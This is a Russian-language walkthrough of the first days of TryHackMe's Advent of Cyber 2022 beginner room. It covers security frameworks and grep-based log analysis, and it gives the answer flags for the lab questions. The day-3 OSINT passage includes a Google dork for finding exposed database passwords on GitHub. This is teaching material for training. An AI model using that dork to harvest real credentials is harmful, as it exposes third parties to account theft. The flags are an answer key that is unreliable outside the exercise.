
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Advent of Cyber 2022](https://tryhackme.com/r/room/adventofcyber4) 

Всего 30 заданий:
## Задание 1
### Добро пожаловать в Advent of Cyber 2022

Начните с Cyber Security за 24 дня! Изучите основы и выполняйте новые, простые для новичков упражнения по 
безопасности каждый день до Рождества.  Это адвент-календарь, но с заданиями по безопасности вместо шоколада! 

### Главные призы 
У нас есть призы на сумму более 40 000 долларов !

В этом событии очки не имеют значения, а вот количество вопросов, на которые вы ответили, имеет значение! За каждый 
правильный ответ вы получаете лотерейный билет. Мы случайным образом выберем победителей 28 декабря, используя 
лотерейные билеты всех участников. Чем больше вопросов вы ответите, тем больше у вас шансов на победу. Вот призы, 
которые можно выиграть:   
- 6 подписок на курс Offensive Security Learn One ($12000)
- 1 TryHackMe пожертвует на благотворительность ($2000)
- 5 Raspberry Pi 400 ($580)
- 10 Airpods 2nd Gen Pro ($2500)
- 6 DJI Drone ($3000)
- 10 GoPro ($3500)
- 10 ваучеров CompTIA Security+ ($2700)	4x Remarkable 2 ($1200)
- 10x Flipper Zero ($2100)
- 12x ASUS ZenBook 14 8 ГБ ОЗУ , 512 ГБ SSD, Intel i5 ($8400)
- 10x Hak5 WiFi Pineapple ($1200)
- 10x Hak5 Rubber Ducky ($600)
- 15x ежемесячных подписок TryHackMe ($150)
- 5x купонов TryHackMe Swag на $20 ($100)

Общая стоимость призового фонда: ~ 40 100 долларов США
Победители подписки Learn One смогут выбрать курс по наступательной безопасности.
Просмотреть Условия и положения розыгрыша призов

### Ежедневные призы
Кроме того, каждый день, когда вы отвечаете на вопрос, вы получаете возможность принять участие в другом розыгрыше 
призов, чтобы выиграть мини-приз. Каждый день вы можете выиграть один из двух призов:  купон на подписку TryHackMe 
на 1 месяц или  купон на 15 фунтов стерлингов.

Победители каждого дня будут объявлены по понедельникам в Twitter, и с ними свяжутся по электронной почте.

### Как получить квалификацию
Чтобы претендовать на призы, вы должны ответить на вопросы в заданиях Advent of Cyber 2022, начиная с Дня 1 
(Задание 6 этой комнаты). Только ответы на вопросы в комнате Advent of Cyber 2022 позволят вам принять участие в 
лотерее.  

Для основного призового фонда не имеет значения, когда вы выполните задания, главное, чтобы вы выполнили их до 28 
декабря 2022 года. Чтобы претендовать на ежедневные призы, вы должны выполнить задания в дни их выпуска (например, 
завершить 8-й день 8 декабря).  

### Сертификат
Наконец, если вы выполните все задания в мероприятии, вы получите сертификат о завершении! Убедитесь, что ваше имя указано в вашем профиле .
Посмотреть образец сертификата

### Видеоролики с описанием
Для каждого выпущенного задания есть видеоруководство. Вы можете ожидать, что некоторые из ваших любимых создателей 
видео по кибербезопасности и стримеров проведут вас через испытания!  В этом году мы представляем Джона Хаммонда, 
Cybersecurity Meg, Husky Hacks, SecurityNinja,  Нила Бриджеса, InsiderPHD  и других! 

### Темы включают в себя
темы, которые будут рассмотрены на мероприятии:

Красная команда Безопасное кодирование Веб-уязвимости Синяя команда Взлом Интернета вещей
### Ответить на вопросы ниже
Прочитайте вышеизложенное и ознакомьтесь с призами! 
```commandline
Ответ не нужен
```

## Задание 2
### Краткое руководство
Новые задания появляются ежедневно в случайное время между 12:00 по Гринвичу и 20:00 по Гринвичу, первый вызов 
появится 1 декабря. Они будут различаться по сложности (хотя всегда будут нацелены на начальный уровень). 

Каждое задание в мероприятии будет включать инструкции по взаимодействию с практическим материалом. Пожалуйста, 
внимательно следуйте им! Ниже приведены некоторые общие рекомендации по подключению: 
- Мы настоятельно рекомендуем вам пройти  обучающую  комнату, чтобы узнать больше о подключении.
- Чтобы получить доступ к некоторым целевым машинам, которые вы развернете на TryHackMe, вам потребуется либо 
  использовать клиент OpenVPN, либо развернуть собственный веб-ориентированный AttackBox.
- Вы можете развернуть AttackBox, нажав синюю кнопку «Запустить AttackBox» в верхней части этой страницы.
- Используя веб-ориентированный AttackBox, вы можете выполнять упражнения через браузер. Если вы постоянный 
  пользователь, вы можете развернуть AttackBox  бесплатно на 1 час в день ; если вы  подписаны , вы можете развернуть его на неограниченное количество времени!
- Одно из заданий в этом событии потребует от вас развернуть Kali Linux VM вместо AttackBox. Если вы не являетесь 
  подписчиком, вам нужно будет использовать собственную VM для этой задачи и подключиться через OpenVPN. 
- Для некоторых задач вам потребуется только развернуть виртуальную машину , не создавая AttackBox.
- В некоторых задачах будет задействовано взаимодействие с сайтами — в этом случае будет достаточно запустить 
  веб-сайт с помощью соответствующей кнопки и открыть его в режиме разделенного просмотра.
### Правила
Нарушение любого из следующих правил приведет к исключению из мероприятия:
- .tryhackme.com и сервер OpenVPN недоступны для зондирования, сканирования или эксплуатации.
- Пользователям разрешено взламывать только те машины, которые размещены в тех комнатах, к которым у них есть доступ.
- Пользователям не разрешается преследовать или атаковать других пользователей.
- Пользователи должны войти в мероприятие только один раз, используя одну учетную запись.
- Ответы на вопросы не подлежат разглашению, за исключением случаев, когда они показаны на видео/трансляциях.

### Ответить на вопросы ниже
Потренируйтесь подключаться к нашей сети!

```commandline
Ответ не нужен
```

## Задание 3
### Ответить на вопросы ниже
Подпишитесь на нас в LinkedIn !
```commandline
Ответ не нужен
```
Присоединяйтесь к нашему Discord и поздоровайтесь!
```commandline
Ответ не нужен
```
Следуйте за нами на Twitter !
```commandline
Ответ не нужен
```
Загляните на сабреддит !
```commandline
Ответ не нужен
```
Присоединяйтесь к нам в  Instagram ! 
```commandline
Ответ не нужен
```
Следите за нами на  Фейсбуке !
```commandline
Ответ не нужен
```
Посмотрите, что мы делаем на Pinterest ! 
```commandline
Ответ не нужен
```

## Задание 4
### Подписка
Событие Advent of Cyber полностью бесплатное! Однако ознакомьтесь с некоторыми причинами, по которым стоит 
подписаться:  
- В честь Advent of Cyber вы можете получить скидку  20% на  персональные годовые подписки, используя код скидки  
AOC2022 при оформлении заказа. Эта скидка действительна только до 7 декабря, то есть в: 

Если вы хотите подарить VIP-подписку TryHackMe, вы можете  приобрести ваучеры .

### Рождественские сувениры
Хотите представить сувениры от вашей любимой платформы обучения кибербезопасности?
У нас есть специальный выпуск рождественской футболки Advent of Cyber, доступный прямо сейчас — посетите наш  
магазин сувениров,  чтобы заказать свою!


### Завершение Advent of Cyber как организации

С помощью панели управления TryHackMe  для бизнеса вы можете делать следующее:
- Получите полный доступ ко всем комнатам и функциям TryHackMe, включая Advent of Cyber
- Используйте конкурентное обучение и коллективно вовлекайте свою команду в выполнение задач Advent of Cyber, 
  оценивая их прогресс
- Создавайте индивидуальные программы обучения для глубокого погружения в дальнейшие темы обучения на основе Advent 
  of Cyber и не только
Мы также проводим ограниченный набор корпоративных обучающих вебинаров для клиентов TryHackMe for Business, чтобы 
  глубоко изучить некоторые темы, которые мы прорабатываем в рамках Advent of Cyber. Более подробная информация об 
  этом появится после начала мероприятия!  

Если вы заинтересованы в изучении множества бизнес-преимуществ TryHackMe, свяжитесь с sales@tryhackme.com для 
получения недельной бесплатной пробной версии панели управления. Настраивайте пути и отслеживайте прогресс своей 
команды для повышения вовлеченности, удовольствия и кибербезопасности!  

Если вы являетесь нашим постоянным клиентом и хотите привлечь к участию более широкую команду и компанию, обратитесь 
к своему персональному менеджеру по работе с клиентами! 

### Ответить на вопросы ниже
Прочитайте вышеизложенное.

```commandline
Ответ не нужен
```

## Задание 5
[Кошмар перед Эльфмасом]

Все упражнения в Advent of Cyber следуют веселой рождественской истории. В этом году эльфу МакСкиди нужна ваша 
помощь, чтобы расследовать серьезную брешь и проверить все оставшиеся системы на наличие уязвимостей безопасности.



Ах, праздничный сезон снова близко! Возможно, вы этого еще не чувствуете, но далеко на севере Эльф МакСкиди уже 
занят тем, чтобы вы получили свои подарки в этом году. Когда она шла по двору мастерской Санты этим утром с чашкой 
горячего шоколада в руках, все, казалось, шло отлично! Подарки упаковывались, олени тренировались на беговых 
дорожках, а сани Санты полировались, все место просто кишело эльфийской деятельностью.   

Когда МакСкиди вошла в офис, она сразу заметила, что что-то на самом деле было не в порядке. Большая, темная, 
полузамороженная карточка просто лежала на ее столе! Кто ее туда положил? Как они попали в запертую комнату Центра 
операций по безопасности ( SOC )? Чего они хотели от директора по информационной безопасности Best Festival Company?!  

Не долго думая, Макскиди нажал большую кнопку «ТРЕВОГА» и крикнул: «Сотрудники службы безопасности! Все наверх. У 
нас инцидент!» 

Ей не пришлось долго ждать — довольно скоро в коридорах офисов Best Festival Company появилась группа специалистов 
по безопасности, мчащаяся в комнату SOC . McReds, этичные хакеры под командованием Санты, которые находят уязвимости 
раньше, чем это сделают плохие парни, вышли из мастерской. Первым был Elf Exploit McRed, затем Elf Recon и, наконец, 
Elf Pivot, катающиеся по ледяному полу. McBlues выбежали со двора, где они устанавливали наблюдение, поскольку они 
отвечают за оборону Санты. McSkidy наблюдал, как Elf Log McBlue вбежали внутрь, за ними последовали Elf Admin и 
Elf ​​Forensic, громко звеня снаряжением, закрепленным на поясах.  Команда безопасности Санты окружила McSkidy, все 
затаили дыхание. McSkidy дрожащими руками взяла со стола зловещую карточку, открыла ее, и все увидели, что было 
внутри:       

    Ох ох ох,
    Кто-то в этом году плохо себя вел, оставив ваш магазин открытым!
    Мы начали с небольшой головоломки. Посмотрим, что еще мы можем сделать!
        - Ваш Тайный Санта

«Но наш магазин не был открыт! Дверь была заперта, когда я вошел. И вы следите за стенами, верно?» — МакСкиди 
посмотрела на свою команду в поисках поддержки. После нескольких щелчков по клавиатуре на ближайшем компьютере, 
администратор МакБлю объявил: «Это сайт сувенирного магазина, МакСкиди. Его испортили. Там…. Головоломка? Там 
говорится, что мы узнаем, кто это сделал, если решим ее».   

В комнате SOC на несколько секунд воцарилась тишина, а затем другие эльфы начали кричать:
- «Нам нужно провести расследование!», «Проверьте журналы!», «Проверьте мониторинг!», «Проведите аудит других систем!
  », «Заблокируйте сеть!» 
- Макскиди подняла руку, ожидая, пока эльфы успокоятся. «Мы уже проходили через что-то подобное в прошлом году. В 
  этом году мы снова спасаем Рождество!» 
- Увидимся в ежедневных заданиях! Надеемся, вы поможете McSkidy и команде узнать, кто их таинственный противник, 
  расследовать инцидент и снова защитить свои системы. Обратите внимание, что сложность заданий может меняться 
  каждый день, но они всегда будут легкодоступны для новичков в кибербезопасности. Веселитесь в Advent of Cyber!  

### Ответить на вопросы ниже
В некоторых заданиях используется рождественская история, поэтому обязательно прочтите вышеизложенное.
```commandline
Ответ не нужен
```
## Задание 6
### Лучшая фестивальная компания скомпрометирована
Кто-то пытается остановить Рождество в этом году и помешать Санте доставлять подарки детям, которые были хорошими в 
этом году. Сайт Best Festival Company  был взломан, и дети по всему миру не могут отправлять свои запросы на подарки.
Необходимо проделать большую работу по расследованию атаки и тестированию других систем! Злоумышленники оставили 
головоломку, которую эльфы должны  решить и узнать, кто их противники. Макскиди посмотрела на головоломку и узнала 
некоторые ее части как фазы Unified Kill Chain , фреймворка безопасности, используемого для понимания 
злоумышленников. Она обратилась к вам, чтобы вы помогли им восстановить их сайт, идентифицировать злоумышленника и 
помочь спасти Рождество.      

### Рамки безопасности
Такие организации, как Santa's Best Festival Company, должны корректировать и улучшать свои усилия по 
кибербезопасности, чтобы предотвратить утечки данных. Фреймворки безопасности вступают в игру, чтобы направлять 
настройку программ безопасности и улучшать состояние безопасности организации.

Рамки безопасности — это документированные процессы, определяющие политики и процедуры, которым должны следовать 
организации для установления и управления средствами контроля безопасности. Это чертежи для выявления и управления 
рисками, с которыми они могут столкнуться, а также слабыми местами, которые могут привести к атаке.  

Фреймворки помогают организациям избавиться от догадок по защите своих данных и инфраструктуры, устанавливая 
процессы и структуры в стратегическом плане. Это также поможет им достичь коммерческих и государственных нормативных 
требований.  

Давайте углубимся и кратко рассмотрим наиболее часто используемые фреймворки.

### Структура кибербезопасности NIST
Cybersecurity Framework ( CSF ) был разработан Национальным институтом стандартов и технологий ( NIST ) и 
предоставляет организациям подробные рекомендации по управлению и снижению рисков кибербезопасности. Framework 
фокусируется на пяти основных функциях: Identify-> Protect-> -> Detect-> Respond-> Recover. Благодаря этим функциям 
framework позволяет организациям расставлять приоритеты в своих инвестициях в кибербезопасность и заниматься 
постоянным совершенствованием в направлении целевого профиля кибербезопасности.    

### Серия ISO 27000
Международная организация по стандартизации (ISO) разрабатывает ряд фреймворков для различных отраслей и секторов. 
Стандарты ISO 27001 и 27002 широко известны в области кибербезопасности и определяют требования и процедуры для 
создания, внедрения и управления системой управления информационной безопасностью (ISMS). Эти стандарты можно 
использовать для оценки способности учреждения соответствовать установленным требованиям информационной безопасности 
посредством применения управления рисками.    

### Фреймворк MITRE ATT&CK
Определение планов атаки противника может быть сложным , если приступать к ним вслепую. Их можно понять с помощью 
поведения, методов, инструментов и стратегий, установленных для атаки, обычно известных как Tactics , Techniques and 
Procedures (TTP). Фреймворк MITRE ATT&CK представляет собой базу знаний TTP, тщательно отобранную и детализированную,
чтобы гарантировать, что команды по безопасности могут идентифицировать шаблоны атак. Структура фреймворка похожа на 
периодическую таблицу, сопоставляющую методы с фазами цепочки атак и ссылающуюся на эксплуатируемые системные 
платформы.      

Эта структура подчеркивает подробный подход, который она обеспечивает при рассмотрении атаки. Она объединяет 
информацию о кибербезопасности, специфичную для среды, чтобы предоставить аналитические сведения о киберугрозах, 
которые помогают командам разрабатывать эффективные программы безопасности для своих организаций. Погрузитесь глубже 
в структуру, изучив специальную комнату MITRE .    

### Кибер-цепочка убийств
Ключевая концепция этой структуры была заимствована из военных с терминологией kill chain , которая описывает 
структуру атаки и состоит из идентификации цели, решения и приказа атаковать цель и, наконец, уничтожения цели. 
Разработанная Lockheed Martin, cyber kill chain описывает этапы, которым обычно следуют кибератаки, и защитники 
безопасности могут использовать структуру как часть обороны, основанной на разведданных.    

В Cyber Kill Chain изложено семь этапов, которые повышают наглядность и понимание тактики, методов и процедур противника.

Изображение, демонстрирующее семь шагов Cyber Kill Chain.

Погрузитесь глубже в цепочку убийств, посетив специальную комнату Cyber Kill Chain .

### Единая цепочка убийств
Как установлено в нашем сценарии, команда Санты получила подсказку о том, кто мог напасть на них, и указала на нее 
Единой Цепи Убийств ( UKC ). Команда Elf Blue начинает свое расследование. 

Unified Kill Chain можно описать как объединение фреймворков MITRE ATT&CK и Cyber Kill Chain. Опубликованный Полом 
Полсом в 2017 году (и пересмотренный в 2022 году), UKC предоставляет модель защиты от кибератак с точки зрения 
противника. UKC предлагает группам безопасности план для анализа и сравнения разведданных об угрозах, касающихся 
состязательного режима работы.   

Unified Kill Chain описывает 18 фаз атаки на основе тактики, техники и процедур (TTP).  Отдельные фазы можно 
объединить для формирования всеобъемлющих целей, таких как получение первоначального плацдарма в целевой сети, 
перемещение по сети для расширения доступа и выполнение действий над критически важными активами. Команде 
безопасности Санты необходимо будет понять, как эти фазы объединяются с точки зрения злоумышленника.   

### ЦИКЛ 1: В
Основное внимание в этой серии фаз направлено на то, чтобы злоумышленник получил доступ к системе или сетевой среде. 
Обычно кибератаки инициируются внешним злоумышленником. Критические шаги, которым они следуют, следующие:  

- Йети наблюдает за тем, как эльфы Санты упаковывают подарки.
- Разведка : злоумышленник проводит исследование цели, используя общедоступную информацию.
- Вооружение : создание необходимой инфраструктуры для размещения центра управления и контроля ( C2 ) имеет решающее 
  значение при проведении атак.
- Доставка : Полезные данные — это вредоносные инструменты,  доставляемые цели различными способами, такими как 
  фишинг электронной почты и атаки на цепочки поставок.
- Социальная инженерия : злоумышленник обманывает свою цель, заставляя ее выполнять ненадежные и небезопасные 
  действия с только что доставленной полезной нагрузкой, часто создавая видимость того, что ее сообщение пришло из надежного внутреннего источника.
- Эксплуатация : если злоумышленник обнаружит существующую уязвимость, слабость программного или аппаратного 
  обеспечения в сетевых активах, он может использовать ее для активации своей полезной нагрузки.
- Упорство : злоумышленник оставит запасное присутствие в сети или активе, чтобы обеспечить себе точку доступа к 
  своей цели.
- Уклонение от защиты : злоумышленник должен сохранять анонимность на протяжении всех своих атак, отключая и избегая 
  любых включенных механизмов защиты безопасности, включая удаление доказательств своего присутствия.
- Command & Control : Помните инфраструктуру, которую подготовил злоумышленник? Канал связи между скомпрометированной 
  системой и инфраструктурой злоумышленника устанавливается через Интернет.
Эту фазу можно считать циклом, поскольку злоумышленник может быть вынужден изменить тактику или модифицировать 
  методы, если не удастся обеспечить вход в сеть. 

### ЦИКЛ 2: Через
На этом этапе злоумышленники будут заинтересованы в получении большего доступа и привилегий к активам в сети.

Злоумышленник может повторять эту фазу до тех пор, пока не получит желаемый доступ.

Йети собирает дары, получив доступ на склад.
- Поворот : Помните систему, которую злоумышленник может использовать для 
сохранения? Эта система станет стартовой площадкой для атаки на другие системы в сети. 
- Discovery : Атакующий будет стремиться собрать как можно больше информации о скомпрометированной системе, например, 
  о доступных пользователях и данных. В качестве альтернативы они могут удаленно обнаружить уязвимости и активы в сети. Это открывает путь для следующего этапа.
- Повышение привилегий : Ограниченный доступ не позволяет злоумышленнику выполнить свою миссию. Поэтому они будут 
  стремиться получить более высокие привилегии на скомпрометированных системах, эксплуатируя выявленные уязвимости или неправильные конфигурации.
- Выполнение : при наличии повышенных привилегий вредоносный код может быть загружен и выполнен с целью извлечения 
  конфиденциальной информации или нанесения дальнейшего ущерба системе.
- Доступ к учетным данным : Часть извлеченной конфиденциальной информации будет включать учетные данные для входа, 
  хранящиеся на жестком диске или в памяти. Это дает злоумышленнику больше огневой мощи для его атак.
- Горизонтальное перемещение : используя извлеченные учетные данные, злоумышленник может перемещаться по различным 
  системам или хранилищам данных в сети, например, в пределах одного отдела.
ПРИМЕЧАНИЕ : Ключевой элемент, который, как можно подумать, отсутствует, — это Доступ. Он формально не 
  рассматривается как фаза UKC , поскольку он пересекается с другими фазами на разных уровнях, что приводит к тому, 
  что противник достигает своих целей для атаки.  

### ЦИКЛ 3: Выход
Конфиденциальность, целостность и доступность ( CIA ) активов или услуг подвергаются риску на этом этапе. Деньги, 
слава или саботаж заставят злоумышленников следовать своим целям для осуществления своих атак, нанести как можно 
больше ущерба и исчезнуть, не будучи обнаруженными.  

Йети покидает склад Санты, довольный своей добычей.
- Сбор : Найдя джекпот данных и информации, злоумышленник попытается собрать все, что ему нужно. При этом 
конфиденциальность активов будет полностью скомпрометирована, особенно когда речь идет о коммерческих секретах и ​​финансовой или персонально идентифицируемой информации ( PII ), которая должна быть защищена.
- Эксфильтрация : Атакующий должен вывести свою добычу из сети. Могут быть использованы различные методы, чтобы 
  гарантировать достижение своих целей, не вызывая подозрений.
- Влияние : При компрометации доступности или целостности актива или информации злоумышленник будет использовать все 
  полученные привилегии для манипулирования, прерывания и саботажа. Представьте себе репутационный, финансовый и социальный ущерб, который придется восстанавливать организации.
- Цели : у злоумышленников могут быть другие цели, которые могут повлиять на социальный или технический ландшафт, в 
  котором действуют их цели. Определение и понимание этих целей, как правило, помогает группам безопасности ознакомиться с инструментами атак противника и провести оценку рисков для защиты своих активов.

### Спасение лучшей фестивальной компании
Проведя проверку UKC вместе с командой безопасности Санты, стало очевидно, что необходимо реализовать более 
эффективные стратегии защиты для повышения устойчивости к атакам. 

Ваша задача — помочь эльфам решить головоломку, оставленную им, чтобы определить, кто пытается остановить Рождество. 
Нажмите кнопку «Просмотр сайта» в верхней части задания, чтобы запустить статический сайт в разделенном виде. 
Возможно, вам придется открыть статический сайт в новом окне и увеличить масштаб, чтобы лучше рассмотреть части 
головоломки.   

Синяя команда эльфов Санты играет с деталями головоломки Unified Kill Chain.

### Ответить на вопросы ниже
Кто в этом году атаковал сеть Санты?
```commandline
The Bandit Yeti
```
Какой флаг они оставили после себя?
```commandline
THM{IT'S A Y3T1 CHR1$TMA$}
```
Хотите узнать больше? Посетите комнаты  Unified Kill Chain ,  Cyber Kill Chain ,  MITRE или весь модуль Cyber Defence Frameworks!  
```commandline
Ответ не нужен
```
## Задание 7
Посмотрите видеообзор CMNatic для второго дня здесь !

Центр безопасности операций Санты (SSOC) обнаружил, что один из их веб-серверов,  santagift.shop  , был захвачен 
группой Bandit Yeti APT . Задача Эльфа МакБлю — проанализировать файлы журналов, полученные с веб-сервера, чтобы 
понять, что происходит, и выследить группу Bandit Yeti APT .  

фотография ElfMcBlue

### Цели обучения

В сегодняшнем задании вы:
- Узнайте, что такое файлы журналов и почему они полезны
- Понять, какую ценную информацию могут содержать файлы журналов
- Поймите некоторые общие места, где можно найти эти файлы журналов.
- Используйте некоторые базовые команды Linux , чтобы начать анализировать файлы журналов для получения ценной 
  информации.
- Помогите Эльфу МакБлю выследить Бандита Йети APT !
Что такое файлы журналов и почему они полезны

Файлы журнала — это файлы, которые содержат исторические записи событий и другие данные из приложения. Некоторые 
общие примеры событий, которые вы можете найти в файле журнала: 
- Попытки входа или неудачи
- Трафик в сети
- Вещи (URL-адреса веб-сайтов, файлы и т. д.), к которым был получен доступ
- Изменение пароля
- Ошибки приложения (используются при отладке)
и многое, многое другое


Файлы журналов, содержащие историческую запись произошедших событий, являются чрезвычайно важными доказательствами при расследовании:
- Что произошло?
- Когда это произошло?
- Где это произошло?
- Кто это сделал? Удалось ли им это?
- Каков результат этого действия?


Например, системный администратор может захотеть регистрировать трафик, происходящий в сети. Мы можем использовать 
  регистрацию, чтобы ответить на вопросы выше в данном сценарии: 


Распространенные расположения файлов журналов

### Окна
Windows имеет встроенное приложение, которое позволяет нам получать доступ к историческим записям событий, которые 
происходят. Event Viewer показан на рисунке ниже: 

изображение средства просмотра событий в Windows

Эти события обычно подразделяются на следующие категории:
Список файлов журналов в каталоге /var/log
```commandline
cmnatic@aoc2022-day-2:/var/log$ ls -lah
total 724K
drwxrwxr-x   9 root      syslog          4.0K Nov 14 10:59 .
drwxr-xr-x  13 root      root            4.0K Oct 26  2020 ..
drwxr--r-x   3 root      root            4.0K Nov 14 10:56 amazon
drwxr-xr-x   2 root      root            4.0K Oct 26  2020 apt
-rw-r-----   1 syslog    adm              11K Nov 14 11:03 auth.log
-rw-rw----   1 root      utmp               0 Oct 26  2020 btmp
-rw-r--r--   1 root      root            7.3K Nov 14 10:59 cloud-init-output.log
-rw-r--r--   1 syslog    adm             251K Nov 14 10:59 cloud-init.log
drwxr-xr-x   2 root      root            4.0K Oct  7  2020 dist-upgrade
-rw-r--r--   1 root      adm              36K Nov 14 10:59 dmesg
-rw-r--r--   1 root      adm              36K Nov 14 10:56 dmesg.0
-rw-r--r--   1 root      root             12K Oct 26  2020 dpkg.log
drwxr-sr-x+  3 root      systemd-journal 4.0K Nov 14 10:55 journal
-rw-r-----   1 syslog    adm              98K Nov 14 10:59 kern.log
drwxr-xr-x   2 landscape landscape       4.0K Nov 14 10:57 landscape
-rw-rw-r--   1 root      utmp            286K Nov 14 11:03 lastlog
drwx------   2 root      root            4.0K Nov 14 10:55 private
-rw-r-----   1 syslog    adm             207K Nov 14 11:03 syslog
drwxr-x---   2 root      adm             4.0K Nov 14 10:55 unattended-upgrades
-rw-rw-r--   1 root      utmp            8.3K Nov 14 11:03 wtmp
```

В следующей таблице приведены некоторые важные файлы журналов:

Файлы журналов могут быстро содержать множество событий и сотни, если не тысячи записей. Сложность анализа файлов журналов заключается в отделении полезной информации от бесполезной. Такие инструменты, как Splunk, являются программными решениями, известными как Security Information and Event Management ( SIEM ), и предназначены для агрегации журналов для анализа. В таблице ниже перечислены некоторые преимущества и недостатки этих платформ:

Грэп 101Эльф из синей команды держит перо и блокнот.

Grep  — это команда, предназначенная для поиска заданного текста в файле.  Grep  берет заданные входные данные 
(текст или значение) и ищет во всем файле любой текст, который соответствует нашим входным данным.  

Перед использованием  grepнам нужно найти местоположение файла журнала, который мы хотим найти. По умолчанию  grep 
будет использоваться ваш текущий рабочий каталог. Вы можете узнать, какой у вас текущий рабочий каталог, используя  
pwd. Например, в терминале ниже мы находимся в рабочем каталоге  /home/cmnatic/aoc2022/day2/:  


Использование pwd для просмотра текущего рабочего каталога
```commandline
cmnatic@thm:~/aoc2022/day2 pwd
           /home/cmnatic/aoc2022/day2/
```

Если мы хотим изменить наш текущий рабочий каталог, вы можете использовать ,  cd а затем новый путь, на который вы 
хотите изменить. Например,  .cd /my/path/here Как только мы определили, что находимся в правильном каталоге, мы 
можем использовать ,  чтобы ls перечислить  файлы и каталоги в нашем текущем рабочем пути. Пример этого был помещен 
в терминал ниже:   

Использование ls для вывода списка файлов и каталогов в нашем текущем каталоге
```commandline
cmnatic@aoc2022-day-2:~$ ls -lah
webserver.log helloworld.txt mydirectory
```

Теперь, когда мы знаем, где находятся наши файлы журналов, мы можем приступить к изучению того, как использовать  
grep. Чтобы использовать grep, нам нужно сделать три вещи: 
- Вызовите команду.
- Укажите любые параметры, которые мы хотим использовать (это будет объяснено позже), но сейчас мы можем это 
  проигнорировать.
- Укажите местоположение файла, в котором мы хотим выполнить поиск ( grep сначала будет предполагаться, что файл 
  находится в вашем текущем каталоге, если вы не укажете иное, указав путь к файлу, например  /path/to/our/logfile.log ).
Например, в терминале ниже мы используем  grep для просмотра файла журнала IP-адреса. Файл журнала находится в нашем 
  текущем рабочем каталоге, поэтому нам не нужно указывать путь к файлу журнала — только имя файла журнала. 

Использование grep для поиска в файле журнала активности с IP-адреса
```commandline
ubuntu@thm:~ grep "192.168.1.30" access.log
192.168.1.30 - - [14/Nov/2022:00:53:07 +0000] "GET / HTTP/1.1" 200 13742
192.168.1.30 - - [14/Nov/2022:00:53:43 +0000] "HEAD
```

В терминале выше мы видим две записи в этом файле журнала (access.log) для IP-адреса " 192.168.1.30 ". Для справки, 
мы сузили две записи из файла журнала с 469 записями. Наша жизнь уже стала проще! Вот несколько идей для вещей, 
которые вы можете захотеть использовать grep для поиска в файле журнала:  
- Имя компьютера.
- Имя файла.
- Имя учетной записи пользователя.
- IP-адрес.
- Определенная временная метка или дата.
Как упоминалось ранее, мы можем предоставить некоторые параметры, чтобы  grep иметь больше контроля над результатами 
  grep. Таблица ниже содержит некоторые общие параметры, которые вы можете использовать с  grep.  


Практика:

логотип группы BanditYeti APT

Для сегодняшней задачи вам нужно будет развернуть машину, прикрепленную к этой задаче, нажав зеленую кнопку 
«Запустить машину», расположенную в правом верхнем углу этой задачи. Машина должна запуститься в режиме разделенного 
экрана. Если этого не произошло, вам нужно будет нажать синюю кнопку «Показать разделенный экран» около правого 
верхнего угла этой страницы.   

При желании вы можете использовать следующие учетные данные для доступа к машине по SSH (не забудьте сначала 
подключиться к VPN ): 

- IP-адрес: MACHINE_IP
- Имя пользователя: elfmcblue
- Пароль: попробуйте взломать меня!
Используйте знания, полученные вами в сегодняшнем задании, чтобы помочь Эльфу МакБлю выследить APT Бандита Йети, 
ответив на вопросы ниже. 

### Ответить на вопросы ниже
Убедитесь, что вы подключены к развертываемой машине при выполнении этой задачи.
```commandline
Ответ не нужен
```
Используйте  ls команду для вывода списка файлов, присутствующих в текущем каталоге. Сколько файлов журнала 
присутствует? 
```commandline
2
```
Elf McSkidy удалось захватить логи, сгенерированные веб-сервером. Как называется этот файл журнала?
```commandline
webserver.log
```
Начните исследование файла журнала с вопроса №3, чтобы ответить на следующие вопросы.
```commandline
Ответ не нужен
```
В какой день у Санты украли список хороших и плохих поступков?
```commandline
Friday
```
Каков IP-адрес злоумышленника?
```commandline
10.10.249.191
```
Как называется важный список, который злоумышленник украл у Санты?
```commandline
santaslist.txt
```
Просмотрите файлы журнала на предмет флага. Формат флага: THM{}
```commandline
THM{STOLENSANTASLIST}
```
Интересуетесь анализом журналов? Мы рекомендуем  комнату журналов событий Windows  или  модуль мониторинга 
безопасности конечных точек.  
```commandline
Ответ не нужен
```

## Задание 8
Посмотрите видеообзор CyberSecMeg для 3-го дня здесь !

Пока эльфы пытаются восстановить взломанный santagift.shopвеб-сайт, эльф Recon McRed пытается выяснить, как он был 
взломан в первую очередь. Можете ли вы помочь ему в сборе информации из открытых источников против веб-сайта?   

### Цели обучения
- Что такое OSINT и какие методы позволяют извлечь полезную информацию о веб-сайте или цели?
- Использование dorks для поиска определенной информации в поисковой системе Google
- Извлечение скрытых каталогов через файл Robots.txt
- Информация о владельце домена через поиск WHOIS
- Поиск данных из взломанных баз данных
- Получение конфиденциальной информации из общедоступных репозиториев GitHub
### Что такое OSINT?
OSINT собирает и анализирует общедоступные данные для разведывательных целей, включая информацию, собранную из 
интернета, СМИ, специализированных журналов и исследований, фотографий и геопространственной информации. Доступ к 
информации можно получить через открытый интернет (индексируемый поисковыми системами), закрытые форумы (не 
индексируемые поисковыми системами) и даже через глубокую и темную паутину. Люди склонны оставлять в интернете много 
информации, которая находится в открытом доступе, что впоследствии приводит к выдаче себя за других, краже личных 
данных и т. д.      

### Методы OSINT
#### Google Дорки
Google Dorking подразумевает использование специальных поисковых терминов и расширенных операторов поиска для поиска 
результатов, которые обычно не отображаются с использованием обычных поисковых терминов. Вы можете использовать их 
для поиска определенных типов файлов, кэшированных версий определенного сайта, веб-сайтов, содержащих определенный 
текст и т. д. Злоумышленники широко используют его для поиска файлов конфигурации веб-сайта и лазеек, оставшихся 
из-за плохих методов кодирования. Некоторые из широко используемых Google dorks упомянуты ниже:    

- inurl : Ищет указанный текст во всех проиндексированных URL. Например, inurl:hacking выберет все URL, содержащие 
слово "взлом".
- filetype : Поиск указанных расширений файлов. Например, filetype:pdf "hacking"выведет все файлы pdf, содержащие 
  слово "взлом". 
- site : Поиск всех проиндексированных URL для указанного домена. Например, site:tryhackme.comвыведет все 
  проиндексированные URL из   tryhackme.com.
- кэш : Получить последнюю кэшированную версию поисковой системы Google. Например, cache:tryhackme.com.


Например, вы можете использовать dork site:github.com "DB_PASSWORD"для поиска только в github.comи поиска строки 
  DB_PASSWORD(возможные учетные данные базы данных). Вы можете узнать больше о dorks Google через эту бесплатную комнату.

Бинго! Мы обнаружили несколько репозиториев с паролями к базам данных.

#### Поиск WHOIS
База данных WHOIS хранит общедоступную информацию, такую как регистратор (владелец домена), административные, 
